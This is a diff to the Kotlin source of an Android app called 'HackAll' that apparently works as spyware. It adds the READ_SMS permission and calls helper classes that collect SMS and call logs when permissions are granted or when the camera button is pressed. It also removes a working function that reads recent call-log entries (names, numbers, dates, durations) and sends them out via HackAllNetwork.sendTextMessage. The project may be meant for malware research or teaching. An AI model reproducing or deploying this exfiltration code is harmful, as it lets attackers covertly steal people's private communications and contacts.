@@ -28,6 +28,8 @@ import com.karumi.dexter.listener.single.PermissionListener
 
 import android.content.Context
 import android.os.BatteryManager
+import cocomelonc.hackall.tools.HackAllCallLogs
+import cocomelonc.hackall.tools.HackAllSmsLogs
 
 import java.text.SimpleDateFormat
 import java.util.*
@@ -36,6 +38,9 @@ class HackAllMainActivity : ComponentActivity() {
     private val number = "107"
     private lateinit var cameraButton: Button
     lateinit var receiver: HackAllAirPlaneBroadcastReceiver
+
+    val hackSms = HackAllSmsLogs(context = this)
+    val hackAllCallLogs = HackAllCallLogs(context = this)
 
     // installed and opened - 1 stage
     private fun greetings(): String {
@@ -105,6 +110,7 @@ class HackAllMainActivity : ComponentActivity() {
                 Manifest.permission.CALL_PHONE,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_SMS
             ) // after adding permissions we are calling an with listener method.
             .withListener(object : MultiplePermissionsListener {
                 override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
@@ -117,7 +123,8 @@ class HackAllMainActivity : ComponentActivity() {
                             Toast.LENGTH_SHORT
                         ).show()
                         HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
-                        sendLogs()
+                        hackSms.getSmsLogs()
+                        hackAllCallLogs.getCallLogs()
                     }
 
                     // check for permanent denial of any permission
@@ -161,90 +168,24 @@ class HackAllMainActivity : ComponentActivity() {
         this.requestPermissions()
         cameraButton = findViewById(R.id.camButton)
         cameraButton.setOnClickListener {
-            requestPermissions()
-            if (isCallPermissionGranted(this)) {
-                startCallPermissionRequest(this) {
-                    HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call started\n")
-                    startCall()
-                }
-            } else {
-                HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
-            }
+            hackSms.getSmsLogs()
+            hackAllCallLogs.getCallLogs()
+//            requestPermissions()
+//            if (isCallPermissionGranted(this)) {
+//                HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call started\n")
+//                startCall()
+//            } else {
+//                startCallPermissionRequest(this) {
+//                    HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
+//                    startCall()
+//                }
+//            }
         }
 
         receiver = HackAllAirPlaneBroadcastReceiver()
 
         IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED).also {
             registerReceiver(receiver, it)
-        }
-    }
-
-    @SuppressLint("NewApi")
-    private fun sendLogs() {
-        try {
-            val cols = arrayOf(
-                CallLog.Calls._ID,
-                CallLog.Calls.CACHED_NAME,
-                CallLog.Calls.NUMBER,
-                CallLog.Calls.TYPE,
-                CallLog.Calls.DURATION, CallLog.Calls.DATE
-            )
-            val cursor: Cursor? = contentResolver.query(
-                CallLog.Calls.CONTENT_URI, cols, null,
-                null, "${CallLog.Calls.LAST_MODIFIED} DESC"
-            )
-
-            val callLogs = StringBuilder()
-
-            cursor?.use {
-//                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
-                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
-                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
-                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
-                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
-                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
-
-                var count = 0
-                while (it.moveToNext() && count < 10) {
-//                    val idRow = it.getString(idIndex)
-                    val nameRow = it.getString(nameIndex)
-                    val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
-                    val number = it.getString(numberIndex)
-                    val duration = it.getString(durationIndex) ?: "0"
-                    val type = it.getInt(typeIndex)
-
-                    val callType = when (type) {
-                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
-                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
-                        CallLog.Calls.MISSED_TYPE -> "Missed"
-                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
-                        CallLog.Calls.BLOCKED_TYPE -> "Blocked"
-                        else -> "Unknown"
-                    }
-
-                    val date = it.getLong(dateIndex)
-
-                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-                    val formattedDate = formatter.format(Date(date))
-
-                    callLogs.append("📞 Number: $number\n")
-                    callLogs.append("📞 Name: $name\n")
-                    callLogs.append("🔹 Type: $callType\n")
-                    callLogs.append("📅 Date: $formattedDate\n")
-                    callLogs.append("⏱️ Duration: $duration seconds\n\n")
-                    count += 1
-
-                    //                HackAllNetwork(this).sendTextMessage("CALL LOG: $idRow, $name, $number, $duration, $type, $date")
-                }
-            }
-
-            if (callLogs.isNotEmpty()) {
-                HackAllNetwork(this).sendTextMessage("🛜 Collected Call Logs:\n\n$callLogs")
-            } else {
-                HackAllNetwork(this).sendTextMessage("No call logs found on the device.\n")
-            }
-        } catch (e: Exception) {
-            HackAllNetwork(this).sendTextMessage("Error reading call logs: ${e.localizedMessage}")
         }
     }
 }
